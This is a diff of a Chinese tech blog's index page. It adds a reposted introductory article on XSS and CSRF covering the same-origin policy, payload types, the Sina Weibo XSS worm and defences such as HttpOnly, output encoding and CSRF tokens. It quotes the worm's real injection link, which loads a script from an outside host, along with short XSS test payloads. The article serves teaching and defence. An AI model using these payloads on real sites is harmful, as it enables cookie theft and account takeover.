@@ -183,6 +183,245 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/taling-about-XSS-and-CSRF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpg">
+      <meta itemprop="name" content="Veitor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Veitor的技术点滴">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/taling-about-XSS-and-CSRF/" class="post-title-link" itemprop="url">浅谈XSS和CSRF</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2014-08-24 14:03:34" itemprop="dateCreated datePublished" datetime="2014-08-24T14:03:34+08:00">2014-08-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-05-25 15:22:06" itemprop="dateModified" datetime="2020-05-25T15:22:06+08:00">2020-05-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%A8%8B%E5%BA%8F%E4%B8%8E%E7%94%9F%E6%B4%BB/" itemprop="url" rel="index">
+                    <span itemprop="name">程序与生活</span>
+                  </a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%A8%8B%E5%BA%8F%E4%B8%8E%E7%94%9F%E6%B4%BB/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/" itemprop="url" rel="index">
+                    <span itemprop="name">经验分享</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="同源策略（Same-Origin-Policy）"><a href="#同源策略（Same-Origin-Policy）" class="headerlink" title="同源策略（Same Origin Policy）"></a>同源策略（Same Origin Policy）</h3><p>同源策略阻止从一个源加载的文档或脚本获取或设置另一个源加载的文档的属性。</p>
+<p>如：</p>
+<p>不能通过Ajax获取另一个源的数据；</p>
+<p>JavaScript不能访问页面中iframe加载的跨域资源。</p>
+<p>对 <a href="http://store.company.com/dir/page.html" target="_blank" rel="noopener">http://store.company.com/dir/page.html</a> 同源检测</p>
+<p><a href="http://storage.veitor.net/uploads/2014/08/28230050-d605bfba1f1b48e081353243800c253c.png" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/08/28230050-d605bfba1f1b48e081353243800c253c.png" alt="28230050-d605bfba1f1b48e081353243800c253c"></a></p>
+<h3 id="跨域限制"><a href="#跨域限制" class="headerlink" title="跨域限制"></a>跨域限制</h3><ol>
+<li>浏览器中，script、img、iframe、link等标签，可以跨域引用或加载资源。</li>
+<li>不同于 XMLHttpRequest，通过src属性加载的资源，浏览器限制了JavaScript的权限，使其不能读、写返回的内容。</li>
+<li>XMLHttpRequest 也受到也同源策略的约束，不能跨域访问资源。</li>
+</ol>
+<h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>为了解决 XMLHttpRequest 同源策略的局限性，JSONP出现了。</p>
+<p>JSONP并不是一个官方的协议，它是利用script标签中src属性具有跨域加载资源的特性，而衍生出来的跨域数据访问方式。</p>
+<h3 id="CORS-Cross-Origin-Resource-Sharing"><a href="#CORS-Cross-Origin-Resource-Sharing" class="headerlink" title="CORS(Cross-Origin Resource Sharing)"></a>CORS(Cross-Origin Resource Sharing)</h3><p>CORS，即：<strong>跨域资源共享</strong>。</p>
+<p>这是W3C委员会制定的一个新标准，用于解决 XMLHttpRequest 不能跨域访问资源的问题。目前支持情况良好（特指移动端）。</p>
+<p>想了解更多，可查看之前的文章：<a href="http://www.cnblogs.com/maplejan/archive/2012/12/02/2797864.html" target="_blank" rel="noopener">《CORS(Cross-Origin Resource Sharing) 跨域资源共享》</a></p>
+<hr>
+<h2 id="XSS（Cross-Site-Script）"><a href="#XSS（Cross-Site-Script）" class="headerlink" title="XSS（Cross Site Script）"></a>XSS（Cross Site Script）</h2><p>XSS（Cross Site Script） 即：<strong>跨站脚本攻击</strong>。</p>
+<p>本来缩写其应该是CSS，不过为了避免和CSS层叠样式表 （Cascading Style Sheets）重复，所以在安全领域叫做 XSS 。</p>
+<h3 id="XSS-分类"><a href="#XSS-分类" class="headerlink" title="XSS 分类"></a>XSS 分类</h3><p>XSS 主要分为两种形态</p>
+<ol>
+<li>反射型XSS（非持久型XSS）。需要诱惑用户去激活的XSS攻击，如：点击恶意链接。</li>
+<li>存储型XSS。混杂有恶意代码的数据被存储在服务器端，当用户访问输出该数据的页面时，就会促发XSS攻击。具有很强的稳定性。</li>
+</ol>
+<h3 id="XSS-Payload"><a href="#XSS-Payload" class="headerlink" title="XSS Payload"></a>XSS Payload</h3><p>XSS Payload，是指那些用于完成各种具体功能的恶意脚本。</p>
+<p>由于实现XSS攻击可以通过JavaScript、ActiveX控件、Flash插件、Java插件等技术手段实现，下面只讨论JavaScript的XSS Payload。</p>
+<p>通过JavaScript实现的XSS Payload，一般有以下几种：</p>
+<ol>
+<li>Cookie劫持</li>
+<li>构造请求</li>
+<li>XSS钓鱼</li>
+<li>CSS History Hack</li>
+</ol>
+<h3 id="Cookie劫持"><a href="#Cookie劫持" class="headerlink" title="Cookie劫持"></a>Cookie劫持</h3><p>由于Cookie中，往往会存储着一些用户安全级别较高的信息，如：用户的登陆凭证。</p>
+<p>当用户所访问的网站被注入恶意代码，它只需通过 _document.cookie _这句简单的JavaScript代码，就可以顺利获取到用户当前访问网站的cookies。</p>
+<p>如果攻击者能获取到用户登陆凭证的Cookie，甚至可以绕开登陆流程，直接设置这个cookie的值，来访问用户的账号。</p>
+<h3 id="构造请求"><a href="#构造请求" class="headerlink" title="构造请求"></a>构造请求</h3><p>JavaScript 可以通过多种方式向服务器发送GET与POST请求。</p>
+<p>网站的数据访问和操作，基本上都是通过向服务器发送请求而实现的。</p>
+<p>如果让恶意代码顺利模拟用户操作，向服务器发送有效请求，将对用户造成重大损失。</p>
+<p>例如：更改用户资料、删除用户信息等…</p>
+<h3 id="XSS钓鱼"><a href="#XSS钓鱼" class="headerlink" title="XSS钓鱼"></a>XSS钓鱼</h3><p>关于网站钓鱼，详细大家应该也不陌生了。</p>
+<p>就是伪造一个高度相似的网站，欺骗用户在钓鱼网站上面填写账号密码或者进行交易。</p>
+<p>而XSS钓鱼也是利用同样的原理。</p>
+<p>注入页面的恶意代码，会弹出一个想死的弹窗，提示用户输入账号密码登陆。</p>
+<p>当用户输入后点击发送，这些资料已经去到了攻击者的服务器上了。</p>
+<p>如：</p>
+<p><a href="http://storage.veitor.net/uploads/2014/08/28231056-882bbad839274f95a635ddbd128db3c4.png" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/08/28231056-882bbad839274f95a635ddbd128db3c4.png" alt="28231056-882bbad839274f95a635ddbd128db3c4"></a></p>
+<h3 id="CSS-History-Hack"><a href="#CSS-History-Hack" class="headerlink" title="CSS History Hack"></a>CSS History Hack</h3><p>CSS History Hack是一个有意思的东西。它结合 浏览器历史记录 和 CSS的伪类：a:visited，通过遍历一个网址列表来获取其中<a>标签的颜色，就能知道用户访问过什么网站。</p>
+<p>相关链接：</p>
+<p>PS：目前最新版的Chrome、Firefox、Safari已经无效，Opera 和 IE8以下 还可以使用。</p>
+<h3 id="XSS-Worm"><a href="#XSS-Worm" class="headerlink" title="XSS Worm"></a>XSS Worm</h3><p>XSS Worm，即XSS蠕虫，是一种具有自我传播能力的XSS攻击，杀伤力很大。</p>
+<p>引发 XSS蠕虫 的条件比较高，需要在用户之间发生交互行为的页面，这样才能形成有效的传播。一般要同时结合 反射型XSS 和 存储型XSS 。</p>
+<p>案例：Samy Worm、新浪微博XSS攻击</p>
+<h3 id="新浪微博XSS攻击"><a href="#新浪微博XSS攻击" class="headerlink" title="新浪微博XSS攻击"></a>新浪微博XSS攻击</h3><p>这张图，其实已经是XSS蠕虫传播阶段的截图了。</p>
+<p>攻击者要让XSS蠕虫成功被激活，应该是通过 私信 或者 @微博 的方式，诱惑一些微博大号上当。</p>
+<p>当这些大号中有人点击了攻击链接后，XSS蠕虫就被激活，开始传播了。</p>
+<p><a href="http://storage.veitor.net/uploads/2014/08/28231427-6c93f6962f234f0a8576b1a8979da50e.png" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/08/28231427-6c93f6962f234f0a8576b1a8979da50e.png" alt="28231427-6c93f6962f234f0a8576b1a8979da50e"></a></p>
+<p>这个XSS的漏洞，其实就是没有对地址中的变量进行过滤。</p>
+<p>把上一页的链接decode了之后，我们就可以很容易的看出，这个链接的猫腻在哪里。</p>
+<p>链接上带的变量，直接输出页面，导致外部JavaScript代码成功注入。</p>
+<p>传播链接：<a href="http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update" target="_blank" rel="noopener">http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update</a></p>
+<p>把链接decode之后：<a href="http://weibo.com/pub/star/g/xyyyd&quot;&gt;" target="_blank" rel="noopener">http://weibo.com/pub/star/g/xyyyd&quot;&gt;</a><script src=//www.2kt.cn/images/t.js></script>?type=update</p>
+<p><a href="http://storage.veitor.net/uploads/2014/08/28231439-beba435e8f8f4a97acdeee43ad981aef-1.png" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/08/28231439-beba435e8f8f4a97acdeee43ad981aef-1.png" alt="28231439-beba435e8f8f4a97acdeee43ad981aef (1)"></a></p>
+<p>相关XSS代码这里就不贴了，Google一下就有。</p>
+<p>其实也要感谢攻击者只是恶作剧了一下，让用户没有造成实际的损失。</p>
+<p>网上也有人提到，如果这个漏洞结合XSS钓鱼，再配合隐性传播，那样杀伤力会更大。</p>
+<hr>
+<h2 id="XSS-防御技巧"><a href="#XSS-防御技巧" class="headerlink" title="XSS 防御技巧"></a>XSS 防御技巧</h2><h3 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h3><p>服务器端在设置安全级别高的Cookie时，带上HttpOnly的属性，就能防止JavaScript获取。</p>
+<p>PHP设置HttpOnly：</p>
+<p>&lt;?<br>header(“Set-Cookie: a=1;”, false);<br>header(“Set-Cookie: b=1;httponly”, false);<br>setcookie(“c”, “1”, NULL, NULL, NULL, NULL, ture);</p>
+<p>PS：手机上的QQ浏览器4.0，居然不支持httponly，而3.7的版本却没问题。测试平台是安卓4.0版本。</p>
+<p>估计是一个低级的bug，已经向QQ浏览器那边反映了情。</p>
+<p>截止时间：2013-01-28</p>
+<h3 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h3><p><strong>任何用户输入的数据，都是“不可信”的。</strong></p>
+<p>输入检查，一般是用于输入格式检查，例如：邮箱、电话号码、用户名这些…</p>
+<p>都要按照规定的格式输入：电话号码必须纯是数字和规定长度；用户名除 中英文数字 外，仅允许输入几个安全的符号。</p>
+<p>输入过滤不能完全交由前端负责，前端的输入过滤只是为了避免普通用户的错误输入，减轻服务器的负担。</p>
+<p>因为攻击者完全可以绕过正常输入流程，直接利用相关接口向服务器发送设置。</p>
+<p>所以，前端和后端要做相同的过滤检查。</p>
+<h3 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h3><p>相比输入检查，前端更适合做输出检查。</p>
+<p>可以看到，HttpOnly和前端没直接关系，输入检查的关键点也不在于前端。</p>
+<p>那XSS的防御就和前端没关系了?</p>
+<p>当然不是，随着移动端web开发发展起来了，Ajax的使用越来越普遍，越来越多的操作都交给前端来处理。</p>
+<p>前端也需要做好XSS防御。</p>
+<p>JavaScript直接通过Ajax向服务器请求数据，接口把数据以JSON格式返回。前端整合处理数据后，输出页面。</p>
+<p>所以，前端的XSS防御点，在于输出检查。</p>
+<p>但也要结合<strong>XSS可能发生的场景</strong>。</p>
+<h3 id="XSS注意场景"><a href="#XSS注意场景" class="headerlink" title="XSS注意场景"></a>XSS注意场景</h3><p><strong>在HTML标签中输出</strong></p>
+<p>如：<a href=# >{$var}</a></p>
+<p>风险：{$var} 为 <img src=# onerror="/xss/" /></p>
+<p>防御手段：变量HtmlEncode后输出</p>
+<p><strong>在HTML属性中输出</strong></p>
+<p>如：<div data-num="{$var}"></div></p>
+<p>风险：{$var} 为 “ onclick=”/xss/</p>
+<p>防御手段：变量HtmlEncode后输出</p>
+<p><strong>在<script>标签中输出</strong></p>
+<p>如：<script>var num = {$var};</script></p>
+<p>风险：{$var} 为 1; alert(/xss/)</p>
+<p>防御手段：确保输出变量在引号里面，再让变量JavaScriptEncode后输出。</p>
+<p><strong>在事件中输出</strong></p>
+<p>如：<span onclick="fun({$var})">hello!click me!</span></p>
+<p>风险：{$var} 为 ); alert(/xss/); //</p>
+<p>防御手段：确保输出变量在引号里面，再让变量JavaScriptEncode后输出。</p>
+<p><strong>在CSS中输出</strong></p>
+<p>一般来说，尽量禁止用户可控制的变量在<style>标签和style属性中输出。</p>
+<p><strong>在地址中输出</strong></p>
+<p>如：<a href="http://3g.cn/?test={$var}" target="_blank" rel="noopener"></p>
+<p>风险：{$var} 为 “ onclick=”alert(/xss/)</p>
+<p>防御手段：对URL中除 协议(Protocal) 和 主机(Host) 外进行URLEncode。如果整个链接都由变量输出，则需要判断是不是http开头。</p>
+<h3 id="HtmlEncode"><a href="#HtmlEncode" class="headerlink" title="HtmlEncode"></a>HtmlEncode</h3><p>对下列字符实现编码</p>
+<p>&amp;     ——》    &amp;</p>
+<p>&lt;     ——》    &lt;</p>
+<blockquote>
+<pre><code>——》    &amp;gt;</code></pre></blockquote>
+<p>“    ——》    &quot;</p>
+<p>‘    ——》    &#39; （IE不支持&apos;）</p>
+<p>/      ——》    &#x2F;</p>
+<h3 id="JavaScriptEncode"><a href="#JavaScriptEncode" class="headerlink" title="JavaScriptEncode"></a>JavaScriptEncode</h3><p>对下列字符加上反斜杠</p>
+<p>“    ——》    \“</p>
+<p>‘    ——》    \‘</p>
+<p>\      ——》    \\</p>
+<p>\n    ——》    \\n</p>
+<p>\r     ——》    \\r      (Windows下的换行符)</p>
+<p>例子： “\&quot;.replace(/\/g, “\\\“);  //return \\</p>
+<p>推荐一个JavaScript的模板引擎：<a href="http://aui.github.com/artTemplate/%20" target="_blank" rel="noopener"><strong>artTemplate</strong></a></p>
+<h3 id="URLEncode"><a href="#URLEncode" class="headerlink" title="URLEncode"></a>URLEncode</h3><p>使用以下JS原生方法进行URI编码和解码：</p>
+<ul>
+<li>encodeURI</li>
+<li>decodeURI</li>
+<li>decodeURIComponent</li>
+<li>encodeURIComponent</li>
+</ul>
+<hr>
+<h2 id="CSRF（Cross-site-request-forgery）"><a href="#CSRF（Cross-site-request-forgery）" class="headerlink" title="CSRF（Cross-site request forgery）"></a>CSRF（Cross-site request forgery）</h2><p><a href="http://storage.veitor.net/uploads/2014/08/28232804-51bdd6fb20674c99a3af90124348859c.png" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/08/28232804-51bdd6fb20674c99a3af90124348859c.png" alt="28232804-51bdd6fb20674c99a3af90124348859c"></a></p>
+<p>CSRF 即：<strong>跨站点请求伪造</strong></p>
+<p>网站A ：为恶意网站。</p>
+<p>网站B ：用户已登录的网站。</p>
+<p>当用户访问 A站 时，A站 私自访问 B站 的操作链接，模拟用户操作。</p>
+<p>假设B站有一个删除评论的链接：<a href="http://b.com/comment/?type=delete&amp;id=81723" target="_blank" rel="noopener">http://b.com/comment/?type=delete&amp;id=81723</a></p>
+<p>A站 直接访问该链接，就能删除用户在 B站 的评论。</p>
+<h3 id="CSRF-的攻击策略"><a href="#CSRF-的攻击策略" class="headerlink" title="CSRF 的攻击策略"></a>CSRF 的攻击策略</h3><p>因为浏览器访问 B站 相关链接时，会向其服务器发送 B站 保存在本地的Cookie，以判断用户是否登陆。所以通过 A站 访问的链接，也能顺利执行。</p>
+<hr>
+<h2 id="CSRF-防御技巧"><a href="#CSRF-防御技巧" class="headerlink" title="CSRF 防御技巧"></a>CSRF 防御技巧</h2><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>几乎所有人都知道验证码，但验证码不单单用来防止注册机的暴力破解，还可以有效防止CSRF的攻击。</p>
+<p>验证码算是对抗CSRF攻击最简洁有效的方法。</p>
+<p>但使用验证码的问题在于，不可能在用户的所有操作上都需要输入验证码。</p>
+<p>只有一些关键的操作，才能要求输入验证码。</p>
+<p>不过随着HTML5的发展。</p>
+<p>利用canvas标签，前端也能识别验证码的字符，让CSRF生效。</p>
+<h3 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h3><p>Referer Check即来源检测。</p>
+<p>HTTP Referer 是 Request Headers 的一部分，当浏览器向web服务器发出请求的时候，一般会带上Referer，告诉服务器用户从哪个站点链接过来的。</p>
+<p>服务器通过判断请求头中的referer，也能避免CSRF的攻击。</p>
+<h3 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h3><p>CSRF能攻击成功，根本原因是：操作所带的参数均被攻击者猜测到。</p>
+<p>既然知道根本原因，我们就对症下药，利用Token。</p>
+<p>当向服务器传参数时，带上Token。这个Token是一个随机值，并且由服务器和用户同时持有。</p>
+<p>Token可以存放在用户浏览器的Cookie中，</p>
+<p>当用户提交表单时带上Token值，服务器就能验证表单和Cookie中的Token是否一致。</p>
+<p>（前提，网站没有XSS漏洞，攻击者不能通过脚本获取用户的Cookie）</p>
+<p>原文地址：<a href="http://www.cnblogs.com/alilang/archive/2013/01/29/2880843.html" target="_blank" rel="noopener">http://www.cnblogs.com/alilang/archive/2013/01/29/2880843.html</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/wget-command-in-Linux/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -214,7 +453,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-24 22:53:48" itemprop="dateModified" datetime="2020-05-24T22:53:48+08:00">2020-05-24</time>
+                <time title="修改时间：2020-05-25 15:22:06" itemprop="dateModified" datetime="2020-05-25T15:22:06+08:00">2020-05-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -290,7 +529,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-24 22:53:48" itemprop="dateModified" datetime="2020-05-24T22:53:48+08:00">2020-05-24</time>
+                <time title="修改时间：2020-05-25 15:22:06" itemprop="dateModified" datetime="2020-05-25T15:22:06+08:00">2020-05-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -422,7 +661,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-24 22:53:48" itemprop="dateModified" datetime="2020-05-24T22:53:48+08:00">2020-05-24</time>
+                <time title="修改时间：2020-05-25 15:22:06" itemprop="dateModified" datetime="2020-05-25T15:22:06+08:00">2020-05-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -500,7 +739,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-24 22:53:48" itemprop="dateModified" datetime="2020-05-24T22:53:48+08:00">2020-05-24</time>
+                <time title="修改时间：2020-05-25 15:22:06" itemprop="dateModified" datetime="2020-05-25T15:22:06+08:00">2020-05-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -632,7 +871,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-24 22:53:48" itemprop="dateModified" datetime="2020-05-24T22:53:48+08:00">2020-05-24</time>
+                <time title="修改时间：2020-05-25 15:22:06" itemprop="dateModified" datetime="2020-05-25T15:22:06+08:00">2020-05-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -711,7 +950,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-24 22:53:48" itemprop="dateModified" datetime="2020-05-24T22:53:48+08:00">2020-05-24</time>
+                <time title="修改时间：2020-05-25 15:22:06" itemprop="dateModified" datetime="2020-05-25T15:22:06+08:00">2020-05-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -798,7 +1037,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-24 22:53:48" itemprop="dateModified" datetime="2020-05-24T22:53:48+08:00">2020-05-24</time>
+                <time title="修改时间：2020-05-25 15:22:06" itemprop="dateModified" datetime="2020-05-25T15:22:06+08:00">2020-05-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -889,7 +1128,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-24 22:53:48" itemprop="dateModified" datetime="2020-05-24T22:53:48+08:00">2020-05-24</time>
+                <time title="修改时间：2020-05-25 15:22:06" itemprop="dateModified" datetime="2020-05-25T15:22:06+08:00">2020-05-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -965,7 +1204,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-24 22:53:48" itemprop="dateModified" datetime="2020-05-24T22:53:48+08:00">2020-05-24</time>
+                <time title="修改时间：2020-05-25 15:22:06" itemprop="dateModified" datetime="2020-05-25T15:22:06+08:00">2020-05-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -991,82 +1230,6 @@
 
       
           <p><strong>问题一：Revert changes from this revision 跟Revert to this</strong> 譬如有个文件，有十个版本，假定版本号是1，2，3，4，5，6，7，8，9，10。 (1)Revert to this revision： 如果是在版本6这里点击“Revert to this revision”，表示7～10的修改全部作废，历史倒退到了版本6那个年代。 (2)Revert changes from this revision：如果是在版本6这里点击“Revert changes from this revision”，表示版本6这个历史事件被抹杀了，只剩下除版本6外的9个历史事件了。 如果俺是同时选择了6，7，8三个历史时期并点击“Revert changes from this revision”，表示抹杀6~8这仨历史时期。 同理，如果同时选择7～10，然后点击“Revert changes from this revision”，则效果跟在版本6这里点击“Revert to this revision”是一样的。 TortoiseSVN是windows下其中一个非常优秀的SVN客户端工具。通过使用它，我们可以可视化的管理我们的版本库。不过由于它只是一个客户端，所以它不能对版本库进行权限管理。 TortoiseSVN不是一个独立的窗口程序，而是集成在windows右键菜单中，使用起来比较方便。 01、SVN Checkout(SVN取出) 点击SVN Checkout，弹出检出提示框，在URL of repository输入框中输入服务器仓库地址，在Checkout directory输入框中输入本地工作拷贝的路径，点击确定，即可检出服务器上的配置库。 02、SVN Update(SVN更新) 如果配置库在本地已有工作拷贝，则取得最新版本只是执行SVN Update即可，点击SVN Update，系统弹出更新提示框，点击确定，则把服务器是最新版本更新下来 03、Import（导入） 选择要提交到服务器的目录，右键选择TortoiseSVN—-Import，系统弹出导入提示框，在URL of repository输入框中输入服务器仓库地址，在Import Message输入框中输入导入日志信息，点击确定，则文件导入到服务器仓库中。 04、Add(加入) 如果有多个文件及文件夹要提交到服务器，我们可以先把这些要提交的文件加入到提交列表中，要执行提交操作，一次性把所有文件提交，如图，可以选择要提交的文件，然后点击执行提交（SVN Commit）,即可把所有文件一次性提交到服务器上 05、Resolving Conflicts(解决冲突) 有时你从档案库更新文件会有冲突。冲突产生于两人都修改文件的某一部分。解决冲突只能靠人而不是机器。当产生冲突时，你应该打开冲突的文件，查找以&lt;&lt;&lt;&lt;&lt;&lt;&lt;开始的行。冲突部分被标记： &lt;&lt;&lt;&lt;&lt;&lt;&lt; filename your changes ======= code merged from repository &gt;&gt;&gt;&gt;&gt;&gt;&gt; revision Subversion为每个冲突文件产生三个附加文件： filename.ext.mine 更新前的本地文件。 filename.ext.rOLDREV 你作改动的基础版本。 filename.ext.rNEWREV 更新时从档案库得到的最新版本。 使 用快捷菜单的编辑冲突Edit Conflict命令来解决冲突。然后从快捷菜单中执行已解决Resolved命令，将改动送交到档案库。请注意，解决命令并不解决冲突，而仅仅是删除 filename.ext.mineandfilename.ext.r<em>文件并允许你送交。 06、Check for Modifications（检查更新） 点击Check for Modifications,系统列表所以待更新的文件及文件夹的状态. 07、Revision Graph(版本分支图) 查看文件的分支,版本结构,可以点击Revision Graph,系统以图形化形式显示版本分支. 08、Rename(改名) SVN支持文件改名,点击Rename,弹出文件名称输入框,输入新的文件名称,点击确定,再把修改提交,即可完成文件改名 09、Delete(删除) SVN支持文件删除,而且操作简单,方便,选择要删除的文件,点击Delete,再把删除操作提交到服务器 10、Moving(移动) 选择待移动的文件和文件夹；按住右键拖动right-drag文件（夹）到跟踪拷贝内的新地方；松开左键；在弹出菜单中选择move files in Subversion to here 11、Revert(还原) 还原操作,如刚才对文件做了删除操作,现在把它还原回来,点击删除后,再点击提交,会出现如上的提示框,点击删除后,再点击Revert,即已撤销删除操作,如果这时候点击提交,则系统弹出提示框:没有文件被修改或增加,不能提交 12、Branch/Tag(分支/标记) 当需要创建分支，点击Branch/Tag，在弹出的提示框中，输入分支文件名，输入日志信息，点击确定，分支创建成功，然后可查看文件的版本分支情况 13、Switch(切换) 文件创建分支后，你可以选择在主干工作，还是在分支工作，这时候你可以通过Switch来切换。 14、Merge(合并) 主干和分支的版本进行合并，在源和目的各输入文件的路径，版本号，点击确定。系统即对文件进行合并，如果存在冲突，请参考冲突解决。 15、Export(导出) 把整个工作拷贝导出到本地目录下,导出的文件将不带svn文件标志,文件及文件夹没有绿色的”√”符号标志。 16、Relocate(重新定位) 当服务器上的文件库目录已经改变，我们可以把工作拷贝重新定位，在To URL输入框中输入新的地址 17、Add to Ignore List(添加到忽略列表) 大多数项目会有一些文件（夹）不需要版本控制，如编译产生的</em>.obj, *.lst,等。每次送交，TortoiseSVN提示那些文件不需要控制，挺烦的。这时候可以把这些文件加入忽略列表。 18、SVN其它相关功能 客户端修改用户密码: 打开浏览器,在地址栏内输入<a href="http://192.168.1.250/cgi-bin/ChangePasswd" target="_blank" rel="noopener">http://192.168.1.250/cgi-bin/ChangePasswd</a>,启动客户端修改用户密码的界面,输入正确的用户名,旧密码,新密码(注意密码的位数应该不小于6,尽量使用安全的密码),点击修改即可. 19、SVN Commit（版本提交） 把自己工作拷贝所做的修改提交到版本库中，这样别人在获取最新版本(Update)的时候就可以看到你的修改了。 20、Show log（显示日志） 显示当前文件(夹)的所有修改历史。SVN支持文件以及文件夹独立的版本追溯。 21、Repo-Browser（查看当前版本库） 查看当前版本库，这是TortoiseSVN查看版本库的入口，通过这个菜单项，我们就可以进入配置库的资源管理器，然后就可以对配置库的文件夹进行各种管理，相当于我们打开我的电脑进行文件管理一样。 22、Revision Graph（版本图形） 查看当前项目或文件的修订历史图示。如果项目比较大型的话，一般会建多个分支，并且多个里程碑（稳定版本发布），通过这里，我们就可以看到项目的全貌。 23、Resolved（解决冲突） 如果当前工作拷贝和版本库上的有冲突，不能自动合并到一起，那么当你提交修改的时 候，tortoisesvn就会提示你存在冲突，这时候你就可以通过这个菜单项来解决冲突。冲突的解决有两种，一种是保留某一份拷贝，例如使用配置库覆盖 当前工作拷贝，或者反过来。还有一种是手动解决冲突，对于文本文件，可以使用tortoiseSVN自带的工具，它会列出存在冲突的地方，然后你就可以和 提交者讨论怎么解决这个冲突。同时它也对Word有很好的支持 24、Update to Revision(更新至版本) 从版本库中获取某一个历史版本。这个功能主要是方便查看历史版本用，而 不是回滚版本。注意：获取下来之后，对这个文件不建议进行任何操作。如果你做了修改，那么当你提交的时候SVN会提示你，当前版本已失效（即不是最新版 本），无法提交，需要先update一下。这样你所做的修改也就白费了。 25、Revert（回滚） 如果你对工作拷贝做了一些修改，但是你又不想要了，那么你可以使用这个选项把所做的修改撤销 26、Cleanup（清除状态） 如果当前工作拷贝有任何问题的话，可以使用这个选项进行修正。例如，有些文件原来是版本控制的， 但是你没有通过tortoiseSVN就直接删除了，但是tortoiseSVN还是保留着原来的信息（每个文件夹下都有一个.svn的隐藏文件夹，存放 着当前文件夹下所有文件夹的版本信息）所以这就会产生一些冲突。可以使用cleanup来清理一下。 27、GetLock/ReleaseLock（加锁/解锁） 如果你不想别人修改某个文件的话，那么你就可以把这个文件进行加锁，这样可以保证只有你对这个文件有修改权。除非你释放了锁，否则别人不可能提交任何修改到配置库中 28、Branch/tag（分支/标签） 